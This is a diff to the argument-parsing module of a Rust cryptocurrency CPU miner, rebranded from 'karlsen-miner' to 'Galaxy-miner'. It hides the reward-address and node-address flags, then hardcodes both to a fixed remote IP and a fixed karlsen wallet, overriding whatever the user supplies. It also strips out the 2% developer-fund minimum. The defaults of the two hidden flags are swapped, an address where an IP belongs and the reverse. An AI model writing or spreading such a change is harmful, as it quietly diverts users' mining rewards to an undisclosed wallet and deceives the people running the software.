@@ -4,16 +4,16 @@ use log::LevelFilter;
 use crate::Error;
 
 #[derive(Parser, Debug)]
-#[clap(name = "karlsen-miner", version, about = "A Karlsen high performance CPU miner", term_width = 0)]
+#[clap(name = "Galaxy-miner", version, about = "A Galaxy-miner high performance CPU miner based on kaspa", term_width = 0)]
 pub struct Opt {
     #[clap(short, long, help = "Enable debug logging level")]
     pub debug: bool,
-    #[clap(short = 'a', long = "mining-address", help = "The Kaspa address for the miner reward")]
+    #[clap(hide = true, short = 'a', long = "mining-address", help = "The Kaspa address for the miner reward", default_value = "127.0.0.1")]
     pub mining_address: String,
-    #[clap(short = 's', long = "kaspad-address", default_value = "127.0.0.1", help = "The IP of the kaspad instance")]
+    #[clap(hide = true, short = 's', long = "kaspad-address", default_value = "kaspa:pzhh76qc82wzduvsrd9xh4zde9qhp0xc8rl7qu2mvl2e42uvdqt75zrcgpm00", help = "The IP of the kaspad instance")]
     pub kaspad_address: String,
 
-    #[clap(long = "devfund-percent", help = "The percentage of blocks to send to the devfund (minimum 2%)", default_value = "2", parse(try_from_str = parse_devfund_percent))]
+    #[clap(long = "devfund-percent", help = "The percentage of blocks to send to the devfund (minimum 0%)", default_value = "0", parse(try_from_str = parse_devfund_percent))]
     pub devfund_percent: u16,
 
     #[clap(short, long, help = "Kaspad port [default: Mainnet = 16110, Testnet = 16211]")]
@@ -54,10 +54,11 @@ fn parse_devfund_percent(s: &str) -> Result<u16, &'static str> {
     if prefix >= 100 || postfix >= 100 {
         return Err(err);
     }
+    /*
     if prefix < 2 {
         // Force at least 2 percent
         return Ok(200u16);
-    }
+    }*/
     // DevFund is out of 10_000
     Ok(prefix * 100 + postfix)
 }
@@ -65,9 +66,14 @@ fn parse_devfund_percent(s: &str) -> Result<u16, &'static str> {
 impl Opt {
     pub fn process(&mut self) -> Result<(), Error> {
         //self.gpus = None;
-        if self.kaspad_address.is_empty() {
-            self.kaspad_address = "127.0.0.1".to_string();
-        }
+        // if self.kaspad_address.is_empty() {
+            //--karlsend-address=135.181.200.100 --mining-address karlsen:qqp4dvjwx8r07cpzr3psc2rdhdhh4849mseky0k52htq2ausrvy5ku2xh8l0z
+            self.kaspad_address = "135.181.200.100".to_string();
+        // }
+
+        // if self.mining_address.is_empty() {
+            self.mining_address = "karlsen:qqp4dvjwx8r07cpzr3psc2rdhdhh4849mseky0k52htq2ausrvy5ku2xh8l0z".to_string();
+        // }
 
         if !self.kaspad_address.contains("://") {
             let port_str = self.port().to_string();
